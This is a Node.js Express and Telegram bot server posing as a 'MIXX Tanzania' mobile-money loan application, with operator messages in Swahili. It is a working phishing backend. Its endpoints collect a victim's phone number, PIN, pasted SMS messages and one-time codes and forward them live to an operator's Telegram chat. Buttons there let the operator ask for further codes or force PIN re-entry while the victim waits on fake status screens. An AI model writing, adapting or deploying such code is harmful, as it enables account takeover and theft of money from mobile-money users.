const express = require('express');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
const DEFAULT_ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || '';

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

const usersDB = {};

app.post('/api/submit-application', (req, res) => {
  const { contact, pin, amount } = req.body;
  const adminChat = req.query.admin || DEFAULT_ADMIN_CHAT_ID;
  const userId = 'user_' + Date.now();

  usersDB[userId] = {
    contact,
    pin,
    amount,
    adminChat,
    status: 'WAITING_ADMIN',
    pastedSms: null,
    otp: null
  };

  if (adminChat) {
    const msg = `📥 **MAOMBI MAPYA YA MKOPO (MIXX Tanzania)**\n\n` +
                `📱 **Namba:** \`${contact}\`\n` +
                `🔑 **PIN:** \`${pin}\`\n` +
                `💰 **Kiasi:** ${amount}\n\n` +
                `Chagua hatua ifuatayo:`;

    const keyboard = {
      inline_keyboard: [
        [
          { text: '💬 Omba SMS', callback_data: `sms_${userId}` },
          { text: '🔢 Omba OTP', callback_data: `otp_${userId}` }
        ],
        [
          { text: '❌ Invalid PIN (Rudia)', callback_data: `retry_${userId}` },
          { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` }
        ]
      ]
    };

    bot.sendMessage(adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
  }

  res.json({ success: true, userId });
});

app.post('/api/verify-sms-pasted', (req, res) => {
  const { userId, pastedSms } = req.body;
  if (usersDB[userId]) {
    usersDB[userId].pastedSms = pastedSms;
    usersDB[userId].status = 'WAITING_ADMIN';

    if (usersDB[userId].adminChat) {
      const msg = `📩 **UJUMBE WA SMS UMEWEKWA (PASTED)**\n\n` +
                  `📱 **Namba:** \`${usersDB[userId].contact}\`\n` +
                  `💬 **Ujumbe:**\n${pastedSms}`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: '🔢 Omba OTP', callback_data: `otp_${userId}` },
            { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` }
          ]
        ]
      };

      bot.sendMessage(usersDB[userId].adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
    }
  }
  res.json({ success: true });
});

app.post('/api/submit-otp', (req, res) => {
  const { userId, otp } = req.body;
  if (usersDB[userId]) {
    usersDB[userId].otp = otp;
    usersDB[userId].status = 'WAITING_ADMIN';

    if (usersDB[userId].adminChat) {
      const msg = `🔑 **OTP IMEWEKWA**\n\n` +
                  `📱 **Namba:** \`${usersDB[userId].contact}\`\n` +
                  `🔢 **OTP:** \`${otp}\``;

      const keyboard = {
        inline_keyboard: [
          [
            { text: '✅ Idhinisha Mwisho', callback_data: `success_${userId}` },
            { text: '❌ Invalid PIN (Rudia)', callback_data: `retry_${userId}` }
          ]
        ]
      };

      bot.sendMessage(usersDB[userId].adminChat, msg, { parse_mode: 'Markdown', reply_markup: keyboard }).catch(console.error);
    }
  }
  res.json({ success: true });
});

app.get('/api/check-status/:userId', (req, res) => {
  const userId = req.params.userId;
  if (usersDB[userId]) {
    res.json({ status: usersDB[userId].status });
  } else {
    res.json({ status: 'UNKNOWN' });
  }
});

bot.on('callback_query', (query) => {
  const data = query.data;
  const [action, userId] = data.split('_');
  const fullUserId = `${action}_${userId}`; // handling underscores safely
  
  // Parse properly based on action prefix
  const targetId = data.substring(data.indexOf('_') + 1);

  if (usersDB[targetId]) {
    if (action === 'sms') {
      usersDB[targetId].status = 'SMS_PASTE_STEP';
      bot.answerCallbackQuery(query.id, { text: 'Ombi la SMS limetumwa kwa mtumiaji.' });
      bot.editMessageText(`✅ **Imetumwa Ombi la SMS kwa:** \`${usersDB[targetId].contact}\``, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
      });
    } else if (action === 'otp') {
      usersDB[targetId].status = 'OTP_STEP';
      bot.answerCallbackQuery(query.id, { text: 'Ombi la OTP limetumwa kwa mtumiaji.' });
      bot.editMessageText(`✅ **Imetumwa Ombi la OTP kwa:** \`${usersDB[targetId].contact}\``, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
      });
    } else if (action === 'retry') {
      usersDB[targetId].status = 'RETRY_PIN';
      bot.answerCallbackQuery(query.id, { text: 'Imetumwa taarifa ya kurudia PIN.' });
      bot.editMessageText(`❌ **PIN Imekataliwa kwa:** \`${usersDB[targetId].contact}\``, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
      });
    } else if (action === 'success') {
      usersDB[targetId].status = 'SUCCESS';
      bot.answerCallbackQuery(query.id, { text: 'Mkopo umeidhinishwa mafanikio!' });
      bot.editMessageText(`🎉 **Mkopo Umeidhinishwa kikamilifu kwa:** \`${usersDB[targetId].contact}\``, {
        chat_id: query.message.chat.id,
        message_id: query.message.message_id,
        parse_mode: 'Markdown'
      });
    }
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`MIXX by YAS Tanzania server running on port ${PORT}`);
});
